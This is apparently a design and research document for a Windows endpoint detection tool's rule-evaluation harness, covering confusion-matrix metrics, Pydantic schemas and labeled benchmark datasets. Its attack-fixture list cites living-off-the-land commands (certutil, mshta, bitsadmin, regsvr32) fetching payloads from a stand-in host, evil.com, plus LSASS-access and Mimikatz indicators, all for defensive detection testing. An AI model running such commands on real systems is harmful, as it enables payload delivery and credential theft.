# Phase 7: False-Positive & Rule Evaluation Engine - Research

**Date:** 2026-11-05  
**Author:** Phase 7 Researcher / WinSentinel Core Team  
**Status:** Complete & Approved for Planning

---

## 1. Executive Summary & Goals

Phase 7 delivers a rigorous, scientific detection evaluation and false-positive benchmarking harness for WinSentinel. As an offline-first Windows endpoint threat monitoring and investigation platform, WinSentinel requires verifiable, repeatable metrics to ensure detection rules maximize True Positives while resisting alert fatigue from benign administrative noise.

The primary goals of this phase are:
1. **Benchmark Evaluation Runner (`EvaluationRunner`)**: Execute loaded Sigma-style detection rules and specialized threat analyzers against curated, labeled ground-truth datasets without altering production databases.
2. **Labeled Benchmark Datasets (`attacks.jsonl` & `benign_admin_noise.jsonl`)**: Provide realistic, multi-scenario Windows telemetry fixtures covering all 16 core Sysmon detection rules alongside typical administrative noise (SCCM/MECM deployments, Windows Update agent runs, Visual Studio / MSBuild compilations, IT admin scripts).
3. **Confusion Matrix & Metric Calculation (`ConfusionMatrixCalculator`)**: Calculate True Positives (TP), False Positives (FP), True Negatives (TN), False Negatives (FN), Precision, Recall, F1-Score, False-Positive Rate (FPR), and Accuracy at per-event granularity with robust zero-division safeguards.
4. **Automated Tuning Recommendations (`RuleTuner`)**: Analyze evaluation results to detect dead rules (0 hits), noisy rules (FPR > 5% or Precision < 80%), and synthesize heuristic suppression suggestions based on common false-positive event attributes.
5. **Benchmark CLI & Report Exporter (`cli.py`)**: Provide CLI and programmatic interfaces exporting structured JSON metrics and formatted Markdown evaluation summaries suitable for detection engineering workflows and Phase 8 SOC Dashboard display.

---

## 2. Technical Domain & Mathematical Formulation

### 2.1 Per-Event Evaluation Granularity

In SIEM/EDR rule benchmarking, evaluation occurs per individual event record:
- An event $e$ has a ground-truth label:
  - `expected_rules: list[str]` — rule IDs that should positively trigger on $e$.
  - `is_malicious: bool` — binary ground truth classification.
- For each evaluated rule $R$ against event $e$:
  - Let $M(R, e) \in \{0, 1\}$ denote whether rule $R$ matched event $e$.
  - Let $E(R, e) \in \{0, 1\}$ denote whether rule $R \in e.\text{expected\_rules}$.

Classification Outcomes per rule $R$ on event $e$:
- **True Positive (TP)**: $M(R, e) = 1 \land E(R, e) = 1$ (Rule fired correctly on an expected threat event).
- **False Positive (FP)**: $M(R, e) = 1 \land E(R, e) = 0$ (Rule fired erroneously on benign noise or unrelated event).
- **False Negative (FN)**: $M(R, e) = 0 \land E(R, e) = 1$ (Rule failed to fire on an expected target event).
- **True Negative (TN)**: $M(R, e) = 0 \land E(R, e) = 0$ (Rule correctly stayed silent on an untargeted event).

### 2.2 Mathematical Metrics & Zero-Division Handling

Detection engineering metrics are calculated per rule and macro/micro-averaged globally:

$$\text{Precision} = \begin{cases} \frac{TP}{TP + FP} & \text{if } TP + FP > 0 \\ 1.0 & \text{if } TP = 0 \land FP = 0 \text{ (no false alarms emitted)} \end{cases}$$

$$\text{Recall} = \begin{cases} \frac{TP}{TP + FN} & \text{if } TP + FN > 0 \\ 0.0 & \text{if } TP = 0 \land FN > 0 \\ 1.0 & \text{if } TP = 0 \land FN = 0 \text{ (no targets expected)} \end{cases}$$

$$\text{F1-Score} = \begin{cases} 2 \cdot \frac{\text{Precision} \cdot \text{Recall}}{\text{Precision} + \text{Recall}} & \text{if } \text{Precision} + \text{Recall} > 0 \\ 0.0 & \text{otherwise} \end{cases}$$

$$\text{False Positive Rate (FPR)} = \begin{cases} \frac{FP}{FP + TN} & \text{if } FP + TN > 0 \\ 0.0 & \text{otherwise} \end{cases}$$

$$\text{Accuracy} = \begin{cases} \frac{TP + TN}{TP + TN + FP + FN} & \text{if } \text{Total} > 0 \\ 0.0 & \text{otherwise} \end{cases}$$

---

## 3. Data Schema & Models

Components in `app/models/evaluation.py`:

```python
from __future__ import annotations
from datetime import datetime, timezone
from enum import Enum
from typing import Any
from pydantic import BaseModel, ConfigDict, Field
from app.models.events import NormalizedEvent

class BenchmarkLabel(BaseModel):
    """Ground truth annotation metadata for benchmark events."""
    model_config = ConfigDict(frozen=True)
    
    is_malicious: bool = False
    expected_rules: list[str] = Field(default_factory=list)
    scenario: str = ""
    description: str = ""
    mitre_attack: list[str] = Field(default_factory=list)

class BenchmarkEvent(BaseModel):
    """Event record pairing normalized Windows event payload with ground truth label."""
    model_config = ConfigDict(frozen=True)
    
    event: NormalizedEvent
    label: BenchmarkLabel

class ConfusionMatrix(BaseModel):
    """Confusion matrix tallying binary classification counts."""
    tp: int = 0
    fp: int = 0
    tn: int = 0
    fn: int = 0
    
    @property
    def total(self) -> int:
        return self.tp + self.fp + self.tn + self.fn

class RuleEvaluationMetrics(BaseModel):
    """Calculated efficacy metrics for a single detection rule."""
    rule_id: str
    rule_title: str
    severity: str
    matrix: ConfusionMatrix
    precision: float
    recall: float
    f1_score: float
    false_positive_rate: float
    accuracy: float
    is_dead: bool = False
    is_noisy: bool = False

class TuningRecommendation(BaseModel):
    """Heuristic tuning recommendation for suboptimal detection rules."""
    rule_id: str
    rule_title: str
    issue: str  # e.g. "HIGH_FPR", "LOW_PRECISION", "ZERO_COVERAGE"
    severity: str  # "HIGH", "MEDIUM", "LOW"
    description: str
    suggested_actions: list[str] = Field(default_factory=list)
    sample_fp_events: list[dict[str, Any]] = Field(default_factory=list)

class EvaluationReport(BaseModel):
    """Global evaluation benchmark summary containing aggregated and per-rule metrics."""
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    dataset_name: str
    total_events: int
    malicious_events: int
    benign_events: int
    total_rules_evaluated: int
    overall_matrix: ConfusionMatrix
    overall_precision: float
    overall_recall: float
    overall_f1_score: float
    overall_fpr: float
    rule_metrics: dict[str, RuleEvaluationMetrics]
    tuning_recommendations: list[TuningRecommendation]
    passed_quality_gates: bool
```

---

## 4. Benchmark Dataset Strategy

To ensure deterministic evaluation without depending on live endpoint telemetry, Phase 7 includes two labeled JSONL dataset files in `tests/data/benchmarks/`:

### 4.1 Attack Dataset (`attacks.jsonl`)
Contains targeted events for all 16 core Sysmon detection rules:
1. `WS-SYS-001`: Suspicious Certutil download (`certutil.exe -urlcache -split -f http://evil.com/payload.exe`)
2. `WS-SYS-002`: Suspicious Mshta execution (`mshta.exe vbscript:GetObject("script:http://evil.com/s.sct")`)
3. `WS-SYS-003`: BITSAdmin download (`bitsadmin.exe /transfer myJob /download /priority high http://evil.com/b.exe`)
4. `WS-SYS-004`: UAC Bypass via Fodhelper (`fodhelper.exe` spawned from Registry registry key edit)
5. `WS-SYS-005`: Rundll32 suspicious execution (`rundll32.exe C:\Users\user\AppData\Local\Temp\evil.dll,EntryPoint`)
6. `WS-SYS-006`: Whoami reconnaissance (`whoami.exe /priv`)
7. `WS-SYS-007`: Regsvr32 Squiblydoo remote script (`regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll`)
8. `WS-SYS-008`: Remote thread injection into LSASS (Sysmon EID 8 targeting `lsass.exe`)
9. `WS-SYS-009`: Remote thread injection into sensitive process (Sysmon EID 8 targeting `explorer.exe`)
10. `WS-SYS-010`: Suspicious LSASS GrantedAccess (Sysmon EID 10 with mask `0x1010` / `0x1f0fff`)
11. `WS-SYS-011`: Mimikatz Sekurlsa Call Trace (Sysmon EID 10 referencing `dbghelp.dll` or `sekurlsa.dll`)
12. `WS-SYS-012`: Unsigned / Untrusted driver loaded (Sysmon EID 6 unsigned)
13. `WS-SYS-013`: DLL loaded from Temp directory (Sysmon EID 7 from `C:\Users\...\AppData\Local\Temp`)
14. `WS-SYS-014`: Registry Run key persistence (Sysmon EID 12/13 modifying `CurrentVersion\Run`)
15. `WS-SYS-015`: IFEO Debugger persistence (Sysmon EID 12/14 creating `Debugger` value in `Image File Execution Options`)
16. `WS-SYS-016`: Suspicious Dynamic DNS query (Sysmon EID 22 querying `duckdns.org` or `ngrok.io`)

### 4.2 Benign Administrative Noise Dataset (`benign_admin_noise.jsonl`)
Contains common administrative operations that typically trigger poorly-tuned rules:
- Microsoft SCCM / MECM software installation (`CcmExec.exe`, `SoftwareDistribution\Download`)
- Windows Update Agent (`TrustedInstaller.exe`, `TiWorker.exe`, `wuauclt.exe`)
- Developer tools (Visual Studio `devenv.exe`, `msbuild.exe`, `git.exe`, `cargo.exe`, node builds)
- Legitimate administrative PowerShell maintenance scripts (`Get-Service`, `Backup-GPO`)
- System service host polling (`svchost.exe -k netsvcs`, `services.exe`)
- Legitimate domain admin queries (`whoami` run in interactive logon session vs automated non-interactive background shells)

---

## 5. Automated Tuning Heuristics (`RuleTuner`)

The `RuleTuner` inspects calculated metrics and false-positive event evidence to provide actionable recommendations:
1. **Dead Rule Check**: If $TP = 0 \land FP = 0$, rule is flagged as `ZERO_COVERAGE` with recommendation to provide test telemetry or verify whether the targeted technique is obsolete.
2. **High FPR Check**: If $\text{FPR} > 0.05$ or $\text{Precision} < 0.80$, rule is flagged as `HIGH_FALSE_POSITIVE_RATE`.
3. **Suppression Suggestion**:
   - Collects all events where $M(R, e) = 1 \land E(R, e) = 0$.
   - Analyzes frequency of common fields (`parent_image`, `user`, `current_directory`, `signer`).
   - If $>70\%$ of FP events share an attribute (e.g., `parent_image == "C:\\Windows\\CCM\\CcmExec.exe"` or `user == "NT AUTHORITY\\SYSTEM"`), synthesizes an exclusion condition recommendation:
     - `filter_sccm: parent_image: 'C:\Windows\CCM\CcmExec.exe'`

---

## 6. Architecture & Implementation Plan

### Plan 07-01: Labeled Benchmark Datasets, Data Models, and Confusion Matrix Calculator
- Implement `app/models/evaluation.py` (Pydantic v2 schemas: `BenchmarkEvent`, `BenchmarkLabel`, `ConfusionMatrix`, `RuleEvaluationMetrics`, `EvaluationReport`, `TuningRecommendation`).
- Implement `app/evaluation/metrics.py` (Pure mathematical confusion matrix calculator with zero-division handling).
- Create test datasets:
  - `tests/data/benchmarks/attacks.jsonl` (covers all 16 Sysmon rules).
  - `tests/data/benchmarks/benign_admin_noise.jsonl` (benign administrative noise).
- Implement dataset loader `load_benchmark_dataset` with validation.
- Unit and property tests verifying metric formulas, dataset parsing, and zero-division edge cases.

### Plan 07-02: Evaluation Runner, Tuning Engine, and Benchmark CLI
- Implement `app/evaluation/runner.py` (`EvaluationRunner` executing detection engine against benchmark datasets, collecting TP/FP/TN/FN).
- Implement `app/evaluation/tuner.py` (`RuleTuner` generating diagnostic recommendations and suppression proposals).
- Implement `app/evaluation/cli.py` (`python -m app.evaluation.cli --rules rules/sysmon --dataset tests/data/benchmarks/attacks.jsonl --output report.json --markdown`).
- Unit and integration tests verifying end-to-end evaluation running, zero false positives on benign dataset, report generation, and CLI exit codes.

---

## 7. Requirement Traceability Matrix

| Requirement | Plan | Component | Verification Criteria |
|-------------|------|-----------|------------------------|
| **EVAL-01** | Plan 07-01, 07-02 | `EvaluationRunner`, `load_benchmark_dataset` | Harness loads benchmark JSONL files and executes DetectionEngine across rules without errors. |
| **EVAL-02** | Plan 07-01 | `ConfusionMatrixCalculator`, `app/models/evaluation.py` | Accurate per-rule and global TP, FP, TN, FN matrix tallies across attack and benign corpora. |
| **EVAL-03** | Plan 07-01, 07-02 | `app/evaluation/metrics.py`, `EvaluationReport` | Calculates Precision, Recall, F1, FPR, and Accuracy; serializes to JSON and formatted Markdown. |
| **EVAL-04** | Plan 07-01, 07-02 | `benign_admin_noise.jsonl`, `test_benign_suppression` | Core Sysmon rules evaluated against benign admin dataset demonstrate 0 false positives (FPR = 0.0%). |

---

*Research concluded. Proceeding to Phase 7 planning.*
